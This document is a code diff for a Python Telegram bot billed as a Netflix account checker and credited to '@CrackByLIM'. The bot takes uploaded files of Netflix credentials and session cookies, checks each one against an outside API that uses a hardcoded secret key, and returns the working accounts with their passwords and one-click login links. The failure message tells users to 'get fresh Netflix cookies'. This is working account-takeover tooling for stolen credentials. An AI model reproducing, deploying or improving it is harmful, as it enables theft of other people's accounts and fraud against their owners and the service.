@@ -3,20 +3,13 @@ import requests
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
 import os
-from dotenv import load_dotenv
-from pathlib import Path
 import time
 from collections import defaultdict
-import asyncio
 import re
-import json
-
-# Load environment variables
-env_path = Path(__file__).parent / '.env'
-load_dotenv(dotenv_path=env_path)
+import asyncio
 
 # Configuration
-TOKEN = os.getenv('BOT_TOKEN')
+TOKEN = os.environ.get('BOT_TOKEN')
 API_URL = "http://genznfapi.onrender.com"
 SECRET_KEY = "KUROSAKI1D_cP642DCEw0bxnMLHSIFlGZQjVh1RgSPM"
 
@@ -24,7 +17,7 @@ SECRET_KEY = "KUROSAKI1D_cP642DCEw0bxnMLHSIFlGZQjVh1RgSPM"
 YOUR_CREDIT = "@CrackByLIM"
 
 if not TOKEN:
-    print("❌ ERROR: BOT_TOKEN not found!")
+    print("❌ ERROR: BOT_TOKEN not found in environment variables!")
     exit(1)
 
 # Enable logging
@@ -169,7 +162,6 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 ✅ Professional processing screen
 ✅ All valid accounts sent after scan
 ✅ Premium login links with buttons
-✅ Detailed statistics
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 📌 **Commands:**
@@ -203,14 +195,8 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 ⚙️ **STEP 2: UPLOAD**
 • Send the file to this chat
-• Watch the professional progress screen
-• **All valid accounts will be sent after scan completes**
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-⌨️ **COMMANDS:**
-/start - Welcome
-/stats - Statistics
-/clear - Clear session
+• Bot will process all accounts
+• Valid accounts sent after scan
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 ⚡ **Powered by {YOUR_CREDIT}** ⚡
@@ -235,9 +221,6 @@ async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 • **📊 Success Rate:** `{success_rate:.1f}%`
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-⚡ **Status:** 🟢 ONLINE
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 ⚡ **Powered by {YOUR_CREDIT}** ⚡
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
     """
@@ -257,7 +240,6 @@ async def clear_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 You can now upload a new file.
 
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 ⚡ **Powered by {YOUR_CREDIT}** ⚡
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
         """,
@@ -267,63 +249,28 @@ You can now upload a new file.
 # ==================== FILE HANDLER ====================
 
 async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle uploaded .txt files with professional processing screen"""
+    """Handle uploaded .txt files"""
     user_id = update.effective_user.id
     global total_checks, valid_accounts
     
     # Check rate limit
     if not check_rate_limit(user_id):
-        await update.message.reply_text(
-            f"""
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-⏰ **RATE LIMIT EXCEEDED**
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-Please wait a minute before trying again.
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-⚡ **Powered by {YOUR_CREDIT}** ⚡
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-            """,
-            parse_mode='Markdown'
-        )
+        await update.message.reply_text("⏰ Rate limit exceeded. Please wait a minute.")
+        return
+    
+    # Check if it's a document
+    if not update.message.document:
         return
     
     document = update.message.document
+    
+    # Check file extension
     if not document.file_name.endswith('.txt'):
-        await update.message.reply_text(
-            f"""
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-❌ **INVALID FILE TYPE**
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-Please upload a `.txt` file.
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-⚡ **Powered by {YOUR_CREDIT}** ⚡
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-            """,
-            parse_mode='Markdown'
-        )
+        await update.message.reply_text("❌ Please upload a `.txt` file.")
         return
     
-    # PROFESSIONAL PROCESSING SCREEN
-    status_msg = await update.message.reply_text(
-        f"""
-╔════════════════════════════════════════╗
-║     🔄 PROCESSING ACCOUNTS FILE 🔄     ║
-╚════════════════════════════════════════╝
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-📁 **File:** `{document.file_name}`
-⏳ **Status:** Initializing...
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-⚡ **Powered by {YOUR_CREDIT}** ⚡
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-        """,
-        parse_mode='Markdown'
-    )
+    # Send initial message
+    status_msg = await update.message.reply_text("📥 Downloading file...")
     
     try:
         # Download file
@@ -333,233 +280,94 @@ Please upload a `.txt` file.
         
         # Split into lines
         lines = content.split('\n')
-        valid_lines = [l for l in lines if l.strip() and not l.startswith('#')]
+        valid_lines = [l.strip() for l in lines if l.strip() and not l.startswith('#')]
         
-        # Update professional screen
-        await status_msg.edit_text(
-            f"""
-╔════════════════════════════════════════╗
-║        📊 ANALYZING FILE 📊            ║
-╚════════════════════════════════════════╝
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-📁 **File:** `{document.file_name}`
-📝 **Total Lines:** `{len(lines)}`
-✅ **Valid Entries:** `{len(valid_lines)}`
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-⚡ **Powered by {YOUR_CREDIT}** ⚡
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-            """,
-            parse_mode='Markdown'
-        )
+        if not valid_lines:
+            await status_msg.edit_text("❌ No valid accounts found in file.")
+            return
         
-        # Process each line
+        await status_msg.edit_text(f"📊 Processing {len(valid_lines)} accounts...")
+        
+        # Process accounts
         valid_count = 0
         invalid_count = 0
-        valid_accounts_found = []  # Store all valid accounts
+        valid_accounts_found = []
         
         for i, line in enumerate(valid_lines, 1):
-            # Parse account
-            account = parse_account_line(line)
-            if not account or 'netflix_id' not in account:
+            try:
+                # Parse account
+                account = parse_account_line(line)
+                if not account or 'netflix_id' not in account:
+                    invalid_count += 1
+                    continue
+                
+                # Update progress
+                if i % 5 == 0 or i == len(valid_lines):
+                    await status_msg.edit_text(f"🔄 Processing: {i}/{len(valid_lines)} (Valid: {valid_count})")
+                
+                # Check with API
+                email = account.get('email', 'Unknown')
+                result = await check_netflix_id(account['netflix_id'], email)
+                
+                # Update stats
+                total_checks += 1
+                
+                if result.get('success'):
+                    valid_count += 1
+                    valid_accounts += 1
+                    valid_accounts_found.append({
+                        'email': email,
+                        'password': account.get('password', 'N/A'),
+                        'login_url': result['login_url'],
+                        'country': account.get('country', 'N/A'),
+                        'plan': account.get('plan', 'N/A'),
+                        'quality': account.get('video_quality', 'N/A'),
+                        'streams': account.get('max_streams', 'N/A')
+                    })
+                else:
+                    invalid_count += 1
+                
+                # Small delay
+                await asyncio.sleep(0.5)
+                
+            except Exception as e:
+                logger.error(f"Error processing line {i}: {e}")
                 invalid_count += 1
                 continue
-            
-            # Calculate progress
-            progress = i / len(valid_lines)
-            bar_length = 20
-            filled = int(bar_length * progress)
-            bar = "█" * filled + "░" * (bar_length - filled)
-            
-            # PROFESSIONAL PROGRESS UPDATE
-            progress_text = f"""
-╔════════════════════════════════════════╗
-║        🔄 PROCESSING ACCOUNTS 🔄       ║
-╚════════════════════════════════════════╝
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-📊 **PROGRESS:** `{i}/{len(valid_lines)}`
-📈 **COMPLETE:** `{progress*100:.1f}%`
-`{bar}`
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-✅ **Valid Found:** `{valid_count}`
-⏳ **Current:** `{account.get('email', 'Unknown')[:30]}...`
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-⚡ **Powered by {YOUR_CREDIT}** ⚡
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-            """
-            
-            await status_msg.edit_text(progress_text, parse_mode='Markdown')
-            
-            # Check with API
-            email = account.get('email', 'Unknown')
-            result = await check_netflix_id(account['netflix_id'], email)
-            
-            # Update global stats
-            total_checks += 1
-            
-            if result.get('success'):
-                valid_count += 1
-                valid_accounts += 1
-                # Store valid account with all details
-                valid_accounts_found.append({
-                    'email': email,
-                    'password': account.get('password', 'N/A'),
-                    'login_url': result['login_url'],
-                    'country': account.get('country', 'N/A'),
-                    'plan': account.get('plan', 'N/A'),
-                    'quality': account.get('video_quality', 'N/A'),
-                    'streams': account.get('max_streams', 'N/A')
-                })
-            else:
-                invalid_count += 1
-            
-            # Small delay to avoid rate limits
-            await asyncio.sleep(0.5)
         
-        # PROFESSIONAL COMPLETION SCREEN
-        success_rate = valid_count/len(valid_lines)*100 if len(valid_lines) > 0 else 0
-        completion_text = f"""
-╔════════════════════════════════════════╗
-║        ✅ PROCESSING COMPLETE ✅       ║
-╚════════════════════════════════════════╝
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-📊 **RESULTS SUMMARY**
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-📁 **File:** `{document.file_name}`
-📝 **Total Processed:** `{len(valid_lines)}`
-✅ **Valid Accounts:** `{valid_count}`
-❌ **Invalid:** `{invalid_count}`
-📈 **Success Rate:** `{success_rate:.1f}%`
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-📌 **Sending {valid_count} valid account(s)...**
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-⚡ **Powered by {YOUR_CREDIT}** ⚡
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-        """
+        # Complete
+        await status_msg.edit_text(f"✅ Processing complete! Found {valid_count} valid accounts.")
         
-        await status_msg.edit_text(completion_text, parse_mode='Markdown')
-        
-        # Send ALL valid accounts AFTER scan is complete
+        # Send valid accounts
         if valid_accounts_found:
             for idx, acc in enumerate(valid_accounts_found, 1):
-                premium_msg = f"""
-╔════════════════════════════════════════╗
-║     ✅ VALID ACCOUNT #{idx}/{valid_count} ✅     ║
-╚════════════════════════════════════════╝
+                msg = f"""
+✅ **VALID ACCOUNT #{idx}**
 
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-📧 **LOGIN CREDENTIALS**
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-• **Email:** `{acc['email']}`
-• **Password:** `{acc['password']}`
-• **Status:** `✅ ACTIVE`
+📧 **Email:** `{acc['email']}`
+🔑 **Password:** `{acc['password']}`
+🌍 **Country:** `{acc['country']}`
+📺 **Plan:** `{acc['plan']}`
 
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-🌍 **ACCOUNT DETAILS**
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-• **Country:** `{acc['country']}`
-• **Plan:** `{acc['plan']}`
-• **Quality:** `{acc['quality']}`
-• **Max Streams:** `{acc['streams']}`
+🔗 **Login Link:** `{acc['login_url']}`
 
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-🔗 **LOGIN LINK**
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-`{acc['login_url']}`
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-⚠️ *Link expires - use it now!*
-
-⚡ **Powered by {YOUR_CREDIT}** ⚡
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+⚡ Powered by {YOUR_CREDIT}
                 """
                 
                 keyboard = [[InlineKeyboardButton("🎬 LAUNCH NETFLIX", url=acc['login_url'])]]
                 
                 await update.message.reply_text(
-                    premium_msg,
-                    reply_markup=InlineKeyboardMarkup(keyboard),
-                    parse_mode='Markdown'
+                    msg,
+                    reply_markup=InlineKeyboardMarkup(keyboard)
                 )
             
-            # Send final summary with all accounts sent
-            final_summary = f"""
-╔════════════════════════════════════════╗
-║        📬 ALL ACCOUNTS SENT 📬         ║
-╚════════════════════════════════════════╝
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-✅ **Successfully sent {valid_count} valid account(s)**
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-💡 **Check messages above for login links**
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-⚡ **Powered by {YOUR_CREDIT}** ⚡
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-            """
-            await update.message.reply_text(final_summary, parse_mode='Markdown')
-            
+            await update.message.reply_text(f"✅ Sent {valid_count} valid accounts!")
         else:
-            # No valid accounts found
-            await update.message.reply_text(
-                f"""
-╔════════════════════════════════════════╗
-║        ❌ NO VALID ACCOUNTS ❌         ║
-╚════════════════════════════════════════╝
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-📊 **RESULT**
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-No valid accounts were found in your file.
-
-💡 **Suggestions:**
-• Get fresh Netflix cookies
-• Check file format
-• Try again later
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-⚡ **Powered by {YOUR_CREDIT}** ⚡
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-                """,
-                parse_mode='Markdown'
-            )
-        
-        # Store in session
-        user_sessions[user_id] = {
-            'last_file': document.file_name,
-            'valid': valid_count,
-            'invalid': invalid_count,
-            'total': valid_count + invalid_count
-        }
+            await update.message.reply_text("❌ No valid accounts found.")
         
     except Exception as e:
-        logger.error(f"Error processing file: {e}")
-        await status_msg.edit_text(
-            f"""
-╔════════════════════════════════════════╗
-║           ❌ ERROR ❌                  ║
-╚════════════════════════════════════════╝
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-📁 **File:** `{document.file_name}`
-❌ **Error:** `{str(e)[:100]}`
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-💡 Please try again or check file format
-
-⚡ **Powered by {YOUR_CREDIT}** ⚡
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-            """,
-            parse_mode='Markdown'
-        )
+        logger.error(f"Error: {e}")
+        await status_msg.edit_text(f"❌ Error: {str(e)[:100]}")
 
 # ==================== BUTTON CALLBACK ====================
 
@@ -568,20 +376,18 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
 
-# ==================== MAIN FUNCTION ====================
+# ==================== MAIN FUNCTION - SIMPLIFIED FOR RAILWAY ====================
 
-async def run_bot():
-    """Run the bot"""
+def main():
+    """Main entry point - simplified for Railway"""
     print("=" * 60)
-    print("🎬 PROFESSIONAL NETFLIX ACCOUNT CHECKER")
+    print("🎬 NETFLIX ACCOUNT CHECKER BOT")
     print("=" * 60)
     print(f"✅ Bot Token: {TOKEN[:10]}...")
     print(f"✅ API URL: {API_URL}")
     print(f"✅ Credit: {YOUR_CREDIT}")
     print("=" * 60)
-    print("🤖 Bot is running... Press Ctrl+C to stop")
-    print("📝 Professional processing screen enabled")
-    print("✅ All valid accounts sent AFTER scan")
+    print("🤖 Bot is starting...")
     print("=" * 60)
     
     # Create application
@@ -593,35 +399,15 @@ async def run_bot():
     app.add_handler(CommandHandler("stats", stats_command))
     app.add_handler(CommandHandler("clear", clear_command))
     app.add_handler(CallbackQueryHandler(button_callback))
-    
-    # File handler
     app.add_handler(MessageHandler(filters.Document.FileExtension("txt"), handle_file))
     
-    # Initialize and start
-    await app.initialize()
-    await app.start()
-    await app.updater.start_polling()
-    
-    try:
-        while True:
-            await asyncio.sleep(1)
-    except KeyboardInterrupt:
-        print("\n👋 Bot stopped by user")
-    finally:
-        await app.updater.stop()
-        await app.stop()
-        await app.shutdown()
-
-def main():
-    """Main entry point"""
-    try:
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-        loop.run_until_complete(run_bot())
-    except KeyboardInterrupt:
-        print("\n👋 Bot stopped by user")
-    except Exception as e:
-        print(f"❌ Error: {e}")
+    # Start the bot
+    print("✅ Bot is now running! Waiting for messages...")
+    app.run_polling(allowed_updates=Update.ALL_TYPES)
 
 if __name__ == '__main__':
-    main()
+    try:
+        main()
+    except Exception as e:
+        print(f"❌ Fatal error: {e}")
+        time.sleep(5)
